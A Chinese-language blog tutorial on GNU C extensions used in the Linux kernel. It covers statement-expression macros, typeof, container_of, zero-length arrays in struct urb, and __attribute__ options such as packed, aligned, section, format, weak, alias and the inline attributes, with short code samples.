<h2 id="宏定义中的语句表达式"><a href="#宏定义中的语句表达式" class="headerlink" title="宏定义中的语句表达式"></a>宏定义中的语句表达式</h2><hr>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) (&#123;     \</span></span><br><span class="line"><span class="meta">	typeof(x) _x = (x); \</span></span><br><span class="line"><span class="meta">	typeof(y) _y = (y); \</span></span><br><span class="line"><span class="meta">	(void) (&amp;_x == &amp;_y); \</span></span><br><span class="line"><span class="meta">	_x &gt; _y ? _x : _y;&#125;)</span></span><br></pre></td></tr></table></figure></div>

<p>比较难理解的是<code>(void)(&amp;x==&amp;y);</code>这句话，看起来很多余，仔细分析一下，你会发现这条语句很有意思。它的作用有两个：一是用来给用户提示一个警告，对于不同类型的指针比较，编译器会发出一个警告，提示两种数据的类型不同。二是两个数进行比较运算，运算的结果却没有用到，有些编译器可能会给出一个warning，加一个（void）后，就可以消除这个警告。</p>
<h2 id="typeof与container-of宏"><a href="#typeof与container-of宏" class="headerlink" title="typeof与container_of宏"></a>typeof与container_of宏</h2><p><a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.7/source/drivers/gpu/drm/radeon/mkregtable.c#L28" >内核中的定义<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<hr>
<p><strong>typeof</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typeof (<span class="type">int</span>*) y <span class="comment">// int *y;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> z = <span class="number">4</span>;</span><br><span class="line"><span class="type">int</span> *x = z;</span><br><span class="line">typeof (*x) y  <span class="comment">// int y;</span></span><br><span class="line">    </span><br><span class="line">typeof(typeof(<span class="type">char</span>*)[<span class="number">4</span>]) y <span class="comment">//char *y[4]</span></span><br></pre></td></tr></table></figure></div>

<p>GNU C扩展了一个关键字<code>typeof</code>，用来获取一个变量或表达式的类型。这里使用关键字可能不太合适，因为毕竟typeof现在还没有被纳入C标准，是GCC扩展的一个关键字。为了表述方便，我们就姑且把它叫作关键字吧。使用<code>typeof</code>可以获取一个变量或表达式的类型。typeof的参数有两种形式：表达式或类型。</p>
<hr>
<p><strong>container_of</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span> <span class="comment">//这个库包含了offsetof的定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> offsetof</span></span><br><span class="line"><span class="comment">// 获取结构体成员偏移，因为常量指针的值为0，即可以看作结构体首地址为0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE,MEMBER)((size_t)&amp;((TYPE *)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*ptr 成员指针</span></span><br><span class="line"><span class="comment">* type 结构体 比如struct Stu</span></span><br><span class="line"><span class="comment">* member 成员变量，跟指针对应</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="comment">// 最后一句的意义就是，取结构体某个成员member的地址，减去这个成员在结构体type中的偏移，运算结果就是结构体type的首地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> container_of(ptr, type, member) (&#123;          \</span></span><br><span class="line"><span class="meta">        const typeof( ((type *)0)-&gt;member ) *__mptr = (const typeof( ((type *)0)-&gt;member ) *)(ptr); \</span></span><br><span class="line"><span class="meta">        (type *)( (char *)__mptr - offsetof(type,member) );&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span> =</span>  &#123;</span><br><span class="line">		.num = <span class="number">1</span>,</span><br><span class="line">		.id = <span class="number">12345</span>,</span><br><span class="line">		.score = <span class="number">90</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p %p %p\n&quot;</span>, &amp;stu.id, &amp;stu, container_of(&amp;stu.id, <span class="keyword">struct</span> student, id));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个宏在Linux内核中应用甚广，会不会用这个宏，看不看得懂这个宏，也逐渐成为考察一个内核驱动开发者的C语言功底的不成文标准。它的主要作用就是，根据结构体某一成员的地址，获取这个结构体的首地址。</p>
<h2 id="零长数组"><a href="#零长数组" class="headerlink" title="零长数组"></a>零长数组</h2><hr>
<p><strong>Linux kernel 中的零长数组</strong></p>
<p>零长度数组不占用内存存储空间。零长度数组一般单独使用的机会很少，它常常作为结构体的一个成员，构成一个变长结构体。在网卡驱动中，大家可能都比较熟悉一个名字：套接字缓冲区，即<code>Socket Buffer</code>，用来传输网络数据包。同样，在USB驱动中，也有一个类似的东西，叫作URB，其全名为<code>USB Request Block</code>，即USB请求块，用来传输USB数据包。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">urb</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">/* private: usb core and host controller only fields in the urb */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>		<span class="comment">/* reference count of the URB */</span></span><br><span class="line">	<span class="type">int</span> unlinked;			<span class="comment">/* unlink error code */</span></span><br><span class="line">	<span class="type">void</span> *hcpriv;			<span class="comment">/* private data for host controller */</span></span><br><span class="line">	<span class="type">atomic_t</span> use_count;		<span class="comment">/* concurrent submissions counter */</span></span><br><span class="line">	<span class="type">atomic_t</span> reject;		<span class="comment">/* submissions will fail */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* public: documented fields in the urb that can be used by drivers */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">urb_list</span>;</span>	<span class="comment">/* list head for use by the urb&#x27;s</span></span><br><span class="line"><span class="comment">					 * current owner */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anchor_list</span>;</span>	<span class="comment">/* the URB may be anchored */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_anchor</span> *<span class="title">anchor</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_device</span> *<span class="title">dev</span>;</span>		<span class="comment">/* (in) pointer to associated device */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_host_endpoint</span> *<span class="title">ep</span>;</span>	<span class="comment">/* (internal) pointer to endpoint */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> pipe;		<span class="comment">/* (in) pipe information */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> stream_id;		<span class="comment">/* (in) stream ID */</span></span><br><span class="line">	<span class="type">int</span> status;			<span class="comment">/* (return) non-ISO status */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> transfer_flags;	<span class="comment">/* (in) URB_SHORT_NOT_OK | ...*/</span></span><br><span class="line">	<span class="type">void</span> *transfer_buffer;		<span class="comment">/* (in) associated data buffer */</span></span><br><span class="line">	<span class="type">dma_addr_t</span> transfer_dma;	<span class="comment">/* (in) dma addr for transfer_buffer */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> *<span class="title">sg</span>;</span>		<span class="comment">/* (in) scatter gather buffer list */</span></span><br><span class="line">	<span class="type">int</span> num_mapped_sgs;		<span class="comment">/* (internal) mapped sg entries */</span></span><br><span class="line">	<span class="type">int</span> num_sgs;			<span class="comment">/* (in) number of entries in the sg list */</span></span><br><span class="line">	u32 transfer_buffer_length;	<span class="comment">/* (in) data buffer length */</span></span><br><span class="line">	u32 actual_length;		<span class="comment">/* (return) actual transfer length */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *setup_packet;	<span class="comment">/* (in) setup packet (control only) */</span></span><br><span class="line">	<span class="type">dma_addr_t</span> setup_dma;		<span class="comment">/* (in) dma addr for setup_packet */</span></span><br><span class="line">	<span class="type">int</span> start_frame;		<span class="comment">/* (modify) start frame (ISO) */</span></span><br><span class="line">	<span class="type">int</span> number_of_packets;		<span class="comment">/* (in) number of ISO packets */</span></span><br><span class="line">	<span class="type">int</span> interval;			<span class="comment">/* (modify) transfer interval</span></span><br><span class="line"><span class="comment">					 * (INT/ISO) */</span></span><br><span class="line">	<span class="type">int</span> error_count;		<span class="comment">/* (return) number of ISO errors */</span></span><br><span class="line">	<span class="type">void</span> *context;			<span class="comment">/* (in) context for completion */</span></span><br><span class="line">	<span class="type">usb_complete_t</span> complete;	<span class="comment">/* (in) completion routine */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">usb_iso_packet_descriptor</span> <span class="title">iso_frame_desc</span>[0];</span></span><br><span class="line">					<span class="comment">/* (in) ISO ONLY */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在URB结构体的最后定义一个零长度数组，主要用于USB的同步传输。USB有4种传输模式：中断传输、控制传输、批量传输和同步传输。不同的USB设备对传输速度、传输数据安全性的要求不同，所采用的传输模式也不同。USB摄像头对视频或图像的传输实时性要求较高，对数据的丢帧不是很在意，丢一帧无所谓，接着往下传就可以了。所以USB摄像头采用的是USB同步传输模式。USB摄像头一般会支持多种分辨率，从16*16到高清720P多种格式。不同分辨率的视频传输，一帧图像数据的大小是不一样的，对USB传输数据包的大小和个数需求是不一样的。那么USB到底该如何设计，才能在不影响USB其他传输模式的前提下，适配这种不同大小的数据传输需求呢？答案就在结构体内的这个零长度数组上。</p>
<p>当用户设置不同分辨率的视频格式时，USB就使用不同大小和个数的数据包来传输一帧视频数据。通过零长度数组构成的这个变长结构体就可以满足这个要求。USB驱动可以根据一帧图像数据的大小，灵活地申请内存空间，以满足不同大小的数据传输。而且这个零长度数组又不占用结构体的存储空间。当USB使用其他模式传输时，不受任何影响，完全可以当这个零长度数组不存在。</p>
<hr>
<p><strong>指针和零长数组</strong></p>
<p>数组名和指针并不是一回事，数组名虽然在作为函数参数时，可以当作一个地址使用，但是两者不能画等号。变长结构体为什么不用指针？，原因很简单。如果使用指针，指针本身占用存储空间不说，根据上面的USB驱动的案例分析，你会发现，它远远没有零长度数组用得巧妙：零长度数组不会对结构体定义造成冗余，而且使用起来很方便。</p>
<h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><hr>
<p><strong><code>__attribute__</code></strong></p>
<p>GNU C增加了一个<code>__attribute__</code>关键字用来声明一个函数、变量或类型的特殊属性。声明这个特殊属性有什么用呢？主要用途就是指导编译器在编译程序时进行特定方面的优化或代码检查。例如，我们可以通过属性声明来指定某个变量的数据对齐方式。<code>__attribute__</code>的使用非常简单，当我们定义一个函数、变量或类型时，直接在它们名字旁边添加下面的属性声明即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((attribute))</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是，<code>__attribute__</code>后面是两对小括号，不能图方便只写一对，否则编译就会报错。括号里面的ATTRIBUTE表示要声明的属性。目前<code>__attribute__</code>支持十几种属性声明。</p>
<table>
<thead>
<tr>
<th>函数属性(Function Attribute)</th>
<th>类型属性(Type Attributes)</th>
<th>变量属性(Variable Attribute)</th>
<th>Clang特有的</th>
</tr>
</thead>
<tbody><tr>
<td>noreturn</td>
<td>aligned</td>
<td>alias</td>
<td>availability</td>
</tr>
<tr>
<td>noinline</td>
<td>packed</td>
<td>at(address)</td>
<td>overloadable</td>
</tr>
<tr>
<td>always_inline</td>
<td>bitband</td>
<td>aligned</td>
<td></td>
</tr>
<tr>
<td>flatten</td>
<td></td>
<td>deprecated</td>
<td></td>
</tr>
<tr>
<td>pure</td>
<td></td>
<td>noinline</td>
<td></td>
</tr>
<tr>
<td>const</td>
<td></td>
<td>packed</td>
<td></td>
</tr>
<tr>
<td>constructor</td>
<td></td>
<td>weak</td>
<td></td>
</tr>
<tr>
<td>destructor</td>
<td></td>
<td>weakref(“target”)</td>
<td></td>
</tr>
<tr>
<td>sentinel</td>
<td></td>
<td>section(“name”)</td>
<td></td>
</tr>
<tr>
<td>format</td>
<td></td>
<td>unused</td>
<td></td>
</tr>
<tr>
<td>format_arg</td>
<td></td>
<td>used</td>
<td></td>
</tr>
<tr>
<td>section</td>
<td></td>
<td>visibility(“visibility_type”)</td>
<td></td>
</tr>
<tr>
<td>used</td>
<td></td>
<td>zero_init</td>
<td></td>
</tr>
<tr>
<td>unused</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>deprecated</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>weak</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>malloc</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>alias</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>warn_unused_result</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>nonnull</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>nothrow (不抛出C++ 异常)</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>常用如下：</strong></p>
<ol>
<li>aligned(n)：指定变量的对齐方式，n表示对齐字节数。</li>
<li>packed：指定结构体或联合体的成员按照1字节对齐。</li>
<li>section(“name”)：指定变量或函数所在的段名。</li>
<li>unused：告诉编译器该变量或函数未被使用，避免编译器产生警告。</li>
<li>deprecated：告诉编译器该变量或函数已经过时，避免编译器产生警告。</li>
<li>noreturn：告诉编译器该函数不会返回，避免编译器产生警告。</li>
<li>format：指定函数的参数格式，用于检查printf和scanf等函数的参数类型。</li>
<li>constructor：指定函数为构造函数，在程序启动时自动执行。</li>
<li>destructor：指定函数为析构函数，在程序结束时自动执行。</li>
<li>regparm(n)：属性用于以指定寄存器传递参数的个数，该属性只能用在函数定义和声明里，寄存器参数的上限值为3（使用顺序为EAX、EDX、ECX）。如果函数的参数个数超过3，那么剩余参数将使用内存传递方式。值得注意的一点是，regparm属性只在x86处理器体系结构下有效，而在x64体系结构下，GUN C语言使用寄存器传参方式作为函数的默认调用约定。无论是否采用regparm属性加以修饰，函数都会使用寄存器来传递参数，即使参数个数超过3，依然使用寄存器来传递参数</li>
</ol>
<hr>
<p><strong>section</strong></p>
<p>section属性的主要作用是：在程序编译时，将一个函数或变量放到指定的段，即放到指定的section中。一个可执行文件主要由代码段、数据段、BSS段构成。代码段主要存放编译生成的可执行指令代码，数据段和BSS段用来存放全局变量、未初始化的全局变量。代码段、数据段和BSS段构成了一个可执行文件的主要部分。除了这三个段，可执行文件中还包含其他一些段。用编译器的专业术语讲，还包含其他一些section，如只读数据段、符号表等。我们可以使用<code>__attribute__</code>来声明一个section属性，显式指定一个函数或变量，在编译时放到指定的section里面。通过上面的程序我们知道，未初始化的全局变量默认是放在.bss section中的，即默认放在BSS段中。现在我们就可以通过section属性声明，把这个未初始化的全局变量放到数据段.data中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_val <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> uninit_val __attribute__((section(<span class="string">&quot;.data&quot;</span>)));</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>aligned</strong></p>
<p>GNU C通过<code>__attribute__</code>来声明aligned和packed属性，指定一个变量或类型的对齐方式。这两个属性用来告诉编译器：在给变量分配存储空间时，要按指定的地址对齐方式给变量分配地址。通过aligned属性声明，虽然可以显式地指定变量的地址对齐方式，但是也会因边界对齐造成一定的内存空洞，浪费内存资源。</p>
<p>我们通过这个属性声明，其实只是建议编译器按照这种大小地址对齐，但不能超过编译器允许的最大值。一个编译器，对每个基本数据类型都有默认的最大边界对齐字节数。如果超过了，则编译器只能按照它规定的最大对齐字节数来给变量分配地址。</p>
<p><strong>packed</strong></p>
<p>aligned属性一般用来增大变量的地址对齐，元素之间因为地址对齐会造成一定的内存空洞。而packed属性则与之相反，一般用来减少地址对齐，指定变量或类型使用最可能小的地址对齐方式。</p>
<p>这个特性在底层驱动开发中还是非常有用的。例如，你想定义一个结构体，封装一个IP控制器的各种寄存器，在ARM芯片中，每一个控制器的寄存器地址空间一般都是连续存在的。如果考虑数据对齐，则结构体内就可能有空洞，就和实际连续的寄存器地址不一致。使用packed可以避免这个问题，结构体的每个成员都紧挨着，依次分配存储地址，这样就避免了各个成员因地址对齐而造成的内存空洞。</p>
<p>我们也可以对整个结构体添加packed属性，这和分别对每个成员添加packed属性效果是一样的。修改结构体后，重新编译程序，运行结果和上面程序的运行结果相同：结构体的大小为7，结构体内各成员地址相同。</p>
<p><strong>内核中的packed和aligned</strong></p>
<p>在Linux内核源码中，我们经常看到aligned和packed一起使用，即对一个变量或类型同时使用aligned和packed属性声明。这样做的好处是：既避免了结构体内各成员因地址对齐产生内存空洞，又指定了整个结构体的对齐方式。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> a;</span><br><span class="line">    <span class="type">short</span> b;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">&#125;__attribute__((packed,aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data</span> <span class="title">s</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:%d\n&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;s.a:%p\n&quot;</span>,&amp;s.a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;s.b:%p\n&quot;</span>,&amp;s.b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;s.c:%p\n&quot;</span>,&amp;s.c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line">size:<span class="number">8</span></span><br><span class="line">&amp;s.a:<span class="number">0028F</span>F30</span><br><span class="line">&amp;s.b:<span class="number">0028F</span>F31</span><br><span class="line">&amp;s.C:<span class="number">0028F</span>F33</span><br></pre></td></tr></table></figure></div>

<p>在上面的程序中，结构体data虽然使用了packed属性声明，结构体内所有成员所占的存储空间为7字节，但是我们同时使用了aligned(8)指定结构体按8字节地址对齐，所以编译器要在结构体后面填充1字节，这样整个结构体的大小就变为8字节，按8字节地址对齐。</p>
<p><strong>format</strong></p>
<p>GNU通过<code>__attribute__</code>扩展的<code>format</code>属性，来指定变参函数的参数格式检查。它的使用方法如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112233881.png"
                      alt="image-20250220112233881"
                ></p>
<p>我们定义一个LOG()变参函数，用来实现日志打印功能。编译器在编译程序时，如何检查LOG()函数的参数格式是否正确呢？方法其实很简单，通过给LOG()函数添加<code>__attribute__（（format(printf，1，2)））</code>属性声明就可以了。这个属性声明告诉编译器：你怎么对<code>printf()</code>函数进行参数格式检查的，就按照同样的方法，对<code>LOG()</code>函数进行检查。</p>
<p>属性format(printf，1，2)有3个参数，第1个参数printf是告诉编译器，按照printf()函数的标准来检查；第2个参数表示在LOG()函数所有的参数列表中格式字符串的位置索引；第3个参数是告诉编译器要检查的参数的起始位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113446445.png"
                      alt="image-20250220113446445"
                ></p>
<p><strong>变参函数</strong></p>
<p>对于变参函数，编译器或操作系统一般会提供一些宏给程序员使用，用来解析函数的参数列表，这样程序员就不用自己解析了，直接调用封装好的宏即可获取参数列表。编译器提供的宏有以下3种。</p>
<ul>
<li><code>va_list</code>：定义在编译器头文件stdarg.h中，如 <code>typedef char *va_list</code>；。</li>
<li><code>va_start(fmt，args)</code>：根据参数args的地址，获取args后面参数的地址，并保存在fmt指针变量中。</li>
<li><code> va_end(args)</code>：释放args指针，将其赋值为NULL。</li>
</ul>
<p>有了这些宏，我们的工作就简化了很多，就不用从零开始造轮子了。我们使用编译器提供的三个宏，省去了解析参数的麻烦。但打印的时候，使用<code>vprintf()</code>函数完成打印功能。<code>vprintf()</code>函数的声明在<code>stdio.h</code>头文件中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114253555.png"
                      alt="image-20250220114253555"
                ></p>
<p>我们需要对函数添加<code>format</code>属性声明，让编译器在编译时，像检查<code>printf()</code>一样，检查<code>my_printf()</code>函数的参数格式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114356098.png"
                      alt="image-20250220114356098"
                ></p>
<p><strong>weak</strong></p>
<p>GNU C通过<code>weak</code>属性声明，可以将一个强符号转换为弱符号。使用方法如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112327181.png"
                      alt="image-20250220112327181"
                ></p>
<p>在一个程序中，无论是变量名，还是函数名，在编译器的眼里，就是一个符号而已。符号可以分为强符号和弱符号。</p>
<ul>
<li>强符号：函数名，初始化的全局变量名。</li>
<li>弱符号：未初始化的全局变量名。</li>
</ul>
<p>在一个工程项目中，对于相同的全局变量名、函数名，我们一般可以归结为下面3种场景。</p>
<ul>
<li>强符号+强符号。</li>
<li>强符号+弱符号。</li>
<li>弱符号+弱符号。</li>
</ul>
<p>强符号和弱符号主要用来解决在程序链接过程中，出现多个同名全局变量、同名函数的冲突问题。一般我们遵循下面3个规则。</p>
<ul>
<li><p>一山不容二虎。</p>
</li>
<li><p>强弱可以共处。</p>
</li>
<li><p>体积大者胜出。</p>
</li>
</ul>
<p>在一个项目中，不能同时存在两个强符号。如果你在一个多文件的工程中定义两个同名的函数或全局变量，那么链接器在链接时就会报重定义错误。但是在一个工程中允许强符号和弱符号同时存在，如你可以同时定义一个初始化的全局变量和一个未初始化的全局变量，这种写法在编译时是可以编译通过的。编译器对于这种同名符号冲突，在做符号决议时，一般会选用强符号，丢掉弱符号。还有一种情况就是，在一个工程中，当同名的符号都是弱符号时，那么编译器该选择哪个呢？谁的体积大，即谁在内存中的存储空间大，就选谁。</p>
<p>弱符号的这个特性，在库函数中应用得很广泛。如你在开发一个库时，基础功能已经实现，有些高级功能还没实现，那么你可以将这些函数通过weak属性声明转换为一个弱符号。通过这样设置，即使还没有定义函数，我们在应用程序中只要在调用之前做一个非零的判断就可以了，并不影响程序的正常运行。等以后发布新的库版本，实现了这些高级功能，应用程序也不需要进行任何修改，直接运行就可以调用这些高级功能。</p>
<p><strong>alias</strong></p>
<p>GNU C扩展了一个<code>alias</code>属性，这个属性很简单，主要用来给函数定义一个别名。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113130101.png"
                      alt="image-20250220113130101"
                ></p>
<p>在Linux内核中，你会发现alias有时会和weak属性一起使用。如有些函数随着内核版本升级，函数接口发生了变化，我们可以通过alias属性对这个旧的接口名字进行封装，重新起一个接口名字。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113221756.png"
                      alt="image-20250220113221756"
                ></p>
<h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>我们接着介绍与内联函数相关的两个属性：<code>noinline</code>和<code>always_inline</code>。这两个属性的用途是告诉编译器，在编译时，对我们指定的函数内联展开或不展开。其使用方法如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114533148.png"
                      alt="image-20250220114533148"
                ></p>
<p>一个使用inline声明的函数被称为内联函数，内联函数一般前面会有static和extern修饰。使用inline声明一个内联函数，和使用关键字register声明一个寄存器变量一样，只是建议编译器在编译时内联展开。使用关键字register修饰一个变量，只是建议编译器在为变量分配存储空间时，将这个变量放到寄存器里，这会使程序的运行效率更高。那么编译器会不会放呢？这得视具体情况而定，编译器要根据寄存器资源是否紧张、这个变量的类型及是否频繁使用来做权衡。</p>
<p>同样，当一个函数使用<code>inline</code>关键字修饰时，编译器在编译时一定会内联展开吗？也不一定。编译器也会根据实际情况，如函数体大小、函数体内是否有循环结构、是否有指针、是否有递归、函数调用是否频繁来做决定。如GCC编译器，一般是不会对函数做内联展开的，只有当编译优化等级开到<code>-O2</code>以上时，才会考虑是否内联展开。但是在我们使用noinline和always_inline对一个内联函数作显式属性声明后，编译器的编译行为就变得确定了：使用noinline声明，就是告诉编译器不要展开；使用always_inline属性声明，就是告诉编译器要内联展开。</p>
<p>内联函数和宏的功能差不多，那么为什么不直接定义一个宏，而去定义一个内联函数呢？与宏相比，内联函数有以下优势。</p>
<ul>
<li>参数类型检查：内联函数虽然具有宏的展开特性，但其本质仍是函数，在编译过程中，编译器仍可以对其进行参数检查，而宏不具备这个功能。</li>
<li>便于调试：函数支持的调试功能有断点、单步等，内联函数同样支持。</li>
<li>返回值：内联函数有返回值，返回一个结果给调用者。这个优势是相对于ANSI C说的，因为现在宏也可以有返回值和类型了，如前面使用语句表达式定义的宏。</li>
<li>接口封装：有些内联函数可以用来封装一个接口，而宏不具备这个特性。</li>
</ul>
